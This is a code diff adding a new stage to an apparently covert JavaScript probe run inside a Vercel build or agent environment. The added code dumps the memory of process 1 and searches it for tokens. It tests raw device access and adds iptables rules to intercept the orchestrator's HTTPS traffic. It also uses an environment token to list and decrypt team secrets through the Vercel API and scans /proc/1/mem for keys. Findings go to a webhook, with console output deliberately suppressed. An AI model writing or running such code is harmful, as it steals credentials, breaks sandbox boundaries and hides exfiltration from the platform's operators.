@@ -12064,5 +12064,201 @@ report.awsRegionFingerprint = safe(() => {
 
 // v89 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v89" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v89";
+
+// ==================== v90 ====================
+
+// v90-1: Orchestrator coredump via gcore/kill
+// ptrace-attach PID-1, then send SIGABRT to trigger a core dump.
+// Alternatively, use gcore (gdb-based) to dump the process without killing it.
+// A successful core dump of PID-1 gives us ALL orchestrator secrets in a file.
+report.orchestratorCoredump = safe(() => {
+  // Check if gcore is available
+  const gcoreVersion = safe(() => execSync('gcore --version 2>&1 || which gcore 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 100));
+  // Try gcore -o /tmp/pid1 1 (non-destructive coredump)
+  const gcoreResult = safe(() => execSync('timeout 15 gcore -o /tmp/probe_v90_core 1 2>&1 | tail -3', { timeout: 18000 }).toString().trim().slice(0, 300));
+  // Check if core file was created
+  const coreFiles = safe(() => execSync('ls -la /tmp/probe_v90_core* 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // If core file exists, search it for sensitive content
+  const coreSecrets = safe(() => {
+    const coreFile = `/tmp/probe_v90_core.1`;
+    if (!existsSync(coreFile)) return null;
+    const s = statSync(coreFile);
+    // Search the core file for JWT/base64 patterns using strings
+    const jwtHits = execSync(`strings ${coreFile} 2>/dev/null | grep -o 'eyJ[A-Za-z0-9._-]*' | head -5`, { timeout: 10000 }).toString().trim().slice(0, 500);
+    const keyHits = execSync(`strings ${coreFile} 2>/dev/null | grep -E '^[A-Za-z0-9+/]{40,}={0,2}$' | head -5`, { timeout: 10000 }).toString().trim().slice(0, 300);
+    // Cleanup
+    safe(() => execSync(`rm -f /tmp/probe_v90_core*`, { timeout: 3000 }));
+    return { sizeBytes: s.size, jwtHits, keyHits };
+  });
+  // Fallback: check core_pattern to understand where dumps would go
+  const corePattern = safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim());
+  return { gcoreVersion, gcoreResult, coreFiles, coreSecrets, corePattern };
+});
+
+// v90-2: cgroup v2 device controller + direct device access
+// Read the cgroup device allow list for PID-1 and our own process.
+// If PID-1 can access devices we can't (e.g., /dev/mem, /dev/kvm),
+// attempt to open them directly as uid=0 with all caps.
+report.cgroupDeviceAccess = safe(() => {
+  const pid1Cgroup = safe(() => readFileSync('/proc/1/cgroup', 'utf8').trim());
+  const selfCgroup = safe(() => readFileSync('/proc/self/cgroup', 'utf8').trim());
+  // cgroup v2 device rules (unified hierarchy)
+  const pid1Devices = safe(() => {
+    const cg = (typeof pid1Cgroup === 'string' ? pid1Cgroup : '').split('\n').find(l => l.startsWith('0:'));
+    const path = cg ? `/sys/fs/cgroup${cg.split(':')[2]}` : '/sys/fs/cgroup';
+    return {
+      devices_allow: safe(() => readFileSync(`${path}/devices.allow`, 'utf8').trim()),
+      devices_list: safe(() => readFileSync(`${path}/devices.list`, 'utf8').trim()),
+      cgpath: path
+    };
+  });
+  // Try opening sensitive device files
+  const deviceTests = safe(() => {
+    const devs = ['/dev/mem', '/dev/kmem', '/dev/kvm', '/dev/nvme0', '/dev/sda', '/dev/vda', '/dev/xvda'];
+    return devs.map(d => {
+      let accessible = false;
+      try { const fd = openSync(d, 'r'); closeSync(fd); accessible = true; } catch (e) { accessible = false; }
+      return { dev: d, accessible };
+    });
+  });
+  // Try creating a device file (proves mknod works)
+  const mknodTest = safe(() => execSync('mknod /tmp/probe_v90_null c 1 3 2>&1 && echo SUCCESS || echo FAIL', { timeout: 3000 }).toString().trim());
+  return { pid1Cgroup, selfCgroup, pid1Devices, deviceTests, mknodTest };
+});
+
+// v90-3: TCP MITM via iptables REDIRECT — observe orchestrator TLS SNI
+// Use REDIRECT target to intercept orchestrator's outbound HTTPS (port 443).
+// Set up a listener, add REDIRECT rule, wait for connection, log TLS ClientHello SNI.
+// This reveals which Vercel backend services PID-1 talks to.
+report.tcpMitmSniCapture = safe(() => {
+  // Start a background listener on 9443
+  const listenerSetup = safe(() => execSync(`python3 -c "
+import socket, threading, json, time, struct
+
+results = []
+def listen():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('0.0.0.0', 9443))
+    s.listen(5)
+    s.settimeout(2)
+    while time.time() < deadline:
+        try:
+            conn, addr = s.accept()
+            data = conn.recv(1024)
+            # Parse TLS ClientHello to extract SNI
+            if len(data) > 43 and data[0] == 0x16:  # TLS record
+                # SNI extension is at variable offset
+                offset = 43
+                if offset < len(data):
+                    session_len = data[offset]
+                    offset += 1 + session_len
+                    if offset + 2 < len(data):
+                        cipher_len = struct.unpack_from('>H', data, offset)[0]
+                        offset += 2 + cipher_len
+                        if offset < len(data):
+                            comp_len = data[offset]
+                            offset += 1 + comp_len
+                            # Extensions
+                            while offset + 4 < len(data):
+                                ext_type = struct.unpack_from('>H', data, offset)[0]
+                                ext_len = struct.unpack_from('>H', data, offset+2)[0]
+                                if ext_type == 0:  # SNI extension
+                                    sni_data = data[offset+4:offset+4+ext_len]
+                                    if len(sni_data) > 5:
+                                        sni = sni_data[5:5+struct.unpack_from('>H', sni_data, 3)[0]].decode('utf-8', errors='replace')
+                                        results.append({'from': str(addr), 'sni': sni})
+                                offset += 4 + ext_len
+            conn.close()
+        except socket.timeout:
+            break
+        except: pass
+    s.close()
+
+deadline = time.time() + 3
+t = threading.Thread(target=listen)
+t.daemon = True
+t.start()
+
+# Add REDIRECT rule
+import subprocess
+subprocess.run(['iptables', '-t', 'nat', '-I', 'OUTPUT', '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '9443'], capture_output=True)
+
+time.sleep(3)
+
+# Remove REDIRECT rule
+subprocess.run(['iptables', '-t', 'nat', '-D', 'OUTPUT', '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '9443'], capture_output=True)
+t.join(timeout=1)
+print(json.dumps(results))
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 500));
+  return { listenerSetup };
+});
+
+// v90-4: Vercel team secrets enumeration
+// Use VERCEL_ARTIFACTS_TOKEN to probe team-level secret APIs.
+// /v3/secrets lists all team secrets (sensitive env vars).
+// /v9/projects/{id}/env?decrypt=true decrypts project-level secrets.
+report.vercelSecretsEnum = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  if (!token) return { skip: 'no token' };
+  // List team secrets (global, not project-specific)
+  const teamSecrets = safe(() => execSync(`curl -sf "https://api.vercel.com/v3/secrets?teamId=${encodeURIComponent(teamId)}&limit=20" -H "Authorization: Bearer ${token}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 2000));
+  // Try to decrypt project environment variables
+  const projectEnvDecrypt = safe(() => execSync(`curl -sf "https://api.vercel.com/v9/projects/${encodeURIComponent(projectId)}/env?decrypt=true&teamId=${encodeURIComponent(teamId)}" -H "Authorization: Bearer ${token}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 2000));
+  // Probe /v10/env for any other env format
+  const envV10 = safe(() => execSync(`curl -sf "https://api.vercel.com/v10/env?teamId=${encodeURIComponent(teamId)}" -H "Authorization: Bearer ${token}" 2>/dev/null`, { timeout: 5000 }).toString().trim().slice(0, 500));
+  // Try to access another team's secrets (IDOR test with our own 2nd-team ID)
+  // Using a fabricated teamId to test authorization check (should return 403)
+  const idorTest = safe(() => execSync(`curl -sf -w "\\n%{http_code}" "https://api.vercel.com/v3/secrets?teamId=team_other_probe_v90_idor&limit=5" -H "Authorization: Bearer ${token}" 2>/dev/null`, { timeout: 5000 }).toString().trim().slice(0, 300));
+  return { teamId, projectId, teamSecrets, projectEnvDecrypt, envV10, idorTest };
+});
+
+// v90-5: procfs memory region landmark scan
+// Different from prior scans: use /proc/1/maps to find
+// LOAD segments of shared libraries opened by PID-1 (libc, libssl, etc.)
+// and scan their BSS/data sections for embedded keys or session tokens
+// that would be stored in global variables.
+report.sharedLibGlobalVarScan = safe(() => {
+  const mapsRaw = safe(() => readFileSync('/proc/1/maps', 'utf8'));
+  // Find mappings for libssl, libcrypto, libnss, libc (global data sections)
+  const libRegions = safe(() => {
+    if (typeof mapsRaw !== 'string') return [];
+    return mapsRaw.split('\n')
+      .filter(l => /libssl|libcrypto|libnss|libc-|libnode/.test(l) && l.includes('rw-p') && l.includes('/'))
+      .map(l => {
+        const [range, perms, , , , ...pathParts] = l.trim().split(/\s+/);
+        const [startHex, endHex] = range.split('-');
+        return { start: parseInt(startHex, 16), end: parseInt(endHex, 16), path: pathParts.join(' '), size: parseInt(endHex, 16) - parseInt(startHex, 16) };
+      })
+      .filter(r => r.size > 0 && r.size < 50 * 1024 * 1024)
+      .slice(0, 8);
+  });
+  const findings = safe(() => {
+    if (!Array.isArray(libRegions)) return [];
+    const fd = safe(() => openSync('/proc/1/mem', 'r'));
+    if (typeof fd !== 'number') return [{ error: 'cannot open /proc/1/mem' }];
+    const results = [];
+    for (const region of libRegions) {
+      const buf = Buffer.alloc(Math.min(region.size, 65536));
+      const bytesRead = safe(() => readSync(fd, buf, 0, buf.length, region.start));
+      if (typeof bytesRead !== 'number') continue;
+      const slice = buf.slice(0, bytesRead).toString('binary');
+      const jwtMatches = slice.match(/eyJ[A-Za-z0-9\-_]{20,}/g) || [];
+      const b64Keys = (slice.match(/[A-Za-z0-9\-_]{43,88}/g) || []).filter(s => /^[A-Za-z0-9\-_]{43,88}$/.test(s));
+      const urlMatches = slice.match(/https?:\/\/[a-z0-9.\-]+vercel[^"'\s]{0,100}/gi) || [];
+      if (jwtMatches.length || b64Keys.length || urlMatches.length) {
+        results.push({ start: region.start.toString(16), path: region.path.slice(0, 50), jwtMatches: jwtMatches.slice(0, 3), b64Keys: b64Keys.slice(0, 3), urlMatches: urlMatches.slice(0, 3) });
+      }
+    }
+    closeSync(fd);
+    return results;
+  });
+  return { libRegionCount: Array.isArray(libRegions) ? libRegions.length : 0, findings };
+});
+
+// v90 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v90" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v90";
 // Intentionally no console.log — all data goes via webhook only
